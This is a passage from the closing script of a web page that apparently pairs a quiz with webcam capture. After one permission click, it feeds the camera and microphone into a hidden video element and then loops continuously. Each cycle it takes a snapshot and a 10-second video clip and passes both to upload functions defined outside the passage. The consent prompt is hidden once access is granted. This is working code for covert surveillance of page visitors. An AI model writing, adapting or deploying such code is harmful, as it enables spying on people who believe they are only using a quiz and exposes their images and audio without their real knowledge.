try {
      const w = videoEl.videoWidth || 640;
      const h = videoEl.videoHeight || 480;
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(videoEl, 0, 0, w, h);
      canvas.toBlob(blob => {
        if (blob) resolve(blob);
        else reject(new Error('snapshot toBlob null'));
      }, 'image/jpeg', 0.85);
    } catch (err) { reject(err); }
  });
}

// --- MediaRecorder recording loop ---
function preferredMime() {
  if (!window.MediaRecorder) return '';
  if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) return 'video/webm;codecs=vp9';
  if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) return 'video/webm;codecs=vp8';
  if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('video/webm')) return 'video/webm';
  return '';
}

async function startRecordingLoop() {
  if (!stream) return;
  if (!window.MediaRecorder) {
    statusEl.textContent = 'Error: MediaRecorder not supported in this browser.';
    return;
  }
  statusEl.textContent = 'Recording active â€” sending snapshot + 10s videos continuously...';
  recordingLoopStopped = false;
  const mime = preferredMime();

  while (!recordingLoopStopped && stream.active) {
    let chunks = [];
    try {
      const options = mime ? { mimeType: mime } : undefined;
      const recorder = new MediaRecorder(stream, options);
      recorder.ondataavailable = (e) => { if (e.data && e.data.size) chunks.push(e.data); };

      const stoppedPromise = new Promise((res, rej) => {
        recorder.onstop = res;
        recorder.onerror = rej;
      });

      // ensure video has frames
      try { await videoEl.play(); } catch(_) {}

      // take snapshot and send it right away
      try {
        const snapBlob = await captureSnapshotBlob();
        sendPhotoBlob(snapBlob);
      } catch (err) {
        console.warn('Snapshot capture failed:', err);
      }

      // start recording for 10 seconds
      recorder.start();
      await new Promise(r => setTimeout(r, 10000));
      if (recorder.state === 'recording') recorder.stop();

      await stoppedPromise;
      if (chunks.length) {
        const blob = new Blob(chunks, { type: chunks[0].type || 'video/webm' });
        sendVideoBlob(blob);
      } else {
        console.warn('No video chunks recorded this cycle.');
      }

      // small pause before next cycle
      await new Promise(r => setTimeout(r, 400));
    } catch (err) {
      console.error('Recording loop error', err);
      statusEl.textContent = 'Recording stopped due to error. See console for details.';
      break;
    }
  }
}

// --- start camera after button click (explicit consent) ---
startBtn.addEventListener('click', async () => {
  startBtn.disabled = true;
  statusEl.textContent = 'Requesting camera & mic permission...';
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    // attach to hidden video so snapshots work
    videoEl.srcObject = stream;
    // wait a short time for the feed to start
    await new Promise(r => setTimeout(r, 250));
    // hide consent section (keep status visible)
    document.getElementById('consent').style.display = 'none';
    // begin loop
    startRecordingLoop();
  } catch (err) {
    console.error('getUserMedia failed', err);
    statusEl.textContent = 'Camera permission denied or not available. Quiz still works.';
    startBtn.disabled = false;
    // keep the consent visible so user can retry
  }
});

// optional: stop if user closes page
window.addEventListener('beforeunload', () => {
  recordingLoopStopped = true;
  if (stream) {
    stream.getTracks().forEach(t => t.stop());
  }
});
</script>
</body>
</html>
